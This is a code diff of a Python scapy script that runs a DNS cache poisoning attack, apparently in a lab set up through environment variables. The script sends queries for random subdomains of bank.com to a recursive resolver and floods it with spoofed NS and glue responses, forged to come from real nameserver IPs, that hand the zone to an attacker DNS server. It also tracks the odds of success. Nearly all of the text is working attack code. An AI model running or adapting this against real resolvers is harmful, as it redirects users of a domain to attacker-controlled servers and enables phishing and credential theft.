@@ -2,7 +2,7 @@ import os
 import random
 from threading import Thread
 
-from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, sr1, sendpfast, Ether
+from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, sendpfast, Ether
 
 # Vulnerable recursive DNS server settings
 victim_dns_ip = os.environ['VLN_SERVER_IP']
@@ -10,8 +10,7 @@ victim_dns_port_in = int(os.environ['VLN_DNS_PORT_IN'])
 victim_dns_port_out = int(os.environ['VLN_DNS_PORT_OUT'])
 
 # Target domain base to be messed with
-victim_host_base = ".bank.com."
-victim_host = "bank.com."
+victim_hostname = "bank.com."
 
 # Malicious DNS server
 attacker_dns_ip = os.environ['ATK_SERVER_IP']
@@ -20,20 +19,13 @@ MAX_TTL = 60 * 60 * 24 * 7
 
 
 def a_request(domain):
-    return IP(dst=victim_dns_ip) / UDP(dport=victim_dns_port_in) / DNS(
+    return IP(dst=victim_dns_ip, flags=2) / UDP(sport=53, dport=victim_dns_port_in) / DNS(
         id=42,
         qr=0,
         opcode=0,
         rd=1,
-        ra=0,
         qdcount=1,
-        ancount=0,
-        nscount=0,
-        arcount=0,
         qd=DNSQR(qname=domain, qtype='A', qclass='IN'),
-        an=0,
-        ns=0,
-        ar=0
     )
 
 
@@ -41,29 +33,26 @@ def forged_ns_response(id, target_domain, known_ns_domain, known_ns_ip):
     response = Ether() / IP(src=known_ns_ip, dst=victim_dns_ip, flags=2) / UDP(
         sport=53, dport=victim_dns_port_out) / DNS(
         id=id,  # Query ID / transaction id
-        qr=1,  # QR (Query / Response) 1=response
-        opcode=0,  # Set by client to 0 for a standard query, 0:"QUERY",1:"IQUERY",2:"STATUS"
-        aa=1,  # Set to 1 in a server response if this dns_response is Authoritative, 0 if not.
-        tc=0,
-        # Set to 1 in a server response if the dns_response can't fit in the 512-byte limit of a UDP packet response
-        rd=0,  # RD (Recursion Desired)
-        ra=0,  # RA (Recursion Available), set by server: will (1) or won't (0) support recursion
-        z=0,  # This is reserved and must be zero
-        rcode=0,  # Response code from the server: indicates success or failure
-        # 0:"ok", 1:"format-error", 2:"server-failure", 3:"name-error", 4:"not-implemented", 5:"refused"
+        qr=1,  # Response
+        opcode=0,  # QUERY
+        aa=0,  # No authoritative answers, as we are not sending any answers
+        tc=0,  # Not truncated
+        rd=0,  # No recursion desired
+        ra=0,  # Recursion is not available, please ask attacker dns
+        z=0,  # Reserved and must be zero
+        rcode=0,  # Response code for "ok"
         qdcount=1,  # Question record count
-        ancount=0,  # Answer count
         nscount=1,  # authority count
         arcount=1,  # additional record count
+        # ancount=1,
         # AD and CD bits are defined in RFC 2535
-        ad=0,  # # Authentic Data
-        cd=0,  # Checking Disabled (0/1)
+        ad=0,  # Authentic Data
+        cd=0,  # Checking Disabled
         # DNS Question Record
         qd=DNSQR(qname=target_domain, qtype='A', qclass='IN'),
         # DNS Resource Record
-        an=0,
-        ns=DNSRR(rrname=victim_host, type='NS', rdata=known_ns_domain, ttl=MAX_TTL),
-        ar=DNSRR(rrname=known_ns_domain, type='A', rdata=attacker_dns_ip, ttl=MAX_TTL)
+        ns=DNSRR(rrname=target_domain, type='NS', rdata="forged." + victim_hostname, ttl=MAX_TTL),
+        ar=DNSRR(rrname="forged." + victim_hostname, type='A', rdata=attacker_dns_ip, ttl=MAX_TTL)
     )
     return response
 
@@ -82,11 +71,10 @@ class Poison(Thread):
         id = random.randrange(2 ** 16)
 
         while self.running:
-            random_domain = "www{}{}{}".format(counter, self.offset, victim_host_base)
+            random_domain = "www{}{}.{}".format(counter, self.offset, victim_hostname)
             counter += 1
 
             packet_list = [Ether() / a_request(random_domain)]
-
             for i in range(self.response_amount):
                 packet_list.append(
                     forged_ns_response(
@@ -103,15 +91,18 @@ class Poison(Thread):
             print("Chance of success: 1-(1-{:d}/65536)**{:d} = {:.2f}"
                   .format(self.response_amount, counter, 1 - pow((1 - self.response_amount / 65536.), counter)))
 
-            sendpfast(packet_list, pps=100000, iface="eth1", verbose=0)
+            # Spam forged responses
+            sendpfast(packet_list, iface="eth1", verbose=False)
 
-            ns_response = sr1(a_request(self.known_ns_domain), verbose=0)
+            # Check if it was a hit
+            # sleep(1)
+            # ns_response = sr1(a_request("forged." + victim_hostname), verbose=False)
 
-            if ns_response[DNS].an.rdata == attacker_dns_ip:
-                print("Successfully poisoned the zone of {}".format(victim_host_base))
-                break
-            else:
-                print("Poisoning failed")
+            # if ns_response[DNS].an.rdata == attacker_dns_ip:
+            #    print("Successfully poisoned the zone of {}".format(victim_hostname))
+            #    break
+            # else:
+            #    print("Poisoning failed")
 
 
 if __name__ == '__main__':
@@ -121,11 +112,13 @@ if __name__ == '__main__':
     known_ns_domain_2 = "ns02.cashparking.com."
     known_ns_ip_2 = "208.109.255.38"
 
-    t1 = Poison(150, known_ns_domain, known_ns_ip, 'c')
-    t2 = Poison(150, known_ns_domain_2, known_ns_ip_2, 'd')
+    t1 = Poison(600, known_ns_domain, known_ns_ip, 'i')
+    # t2 = Poison(600, known_ns_domain_2, known_ns_ip_2, 'b')
     try:
         t1.start()
-        t2.start()
+        # t2.start()
     except KeyboardInterrupt:
         t1.running = False
-        t2.running = False
+        # t2.running = False
+
+        # 21:19:57
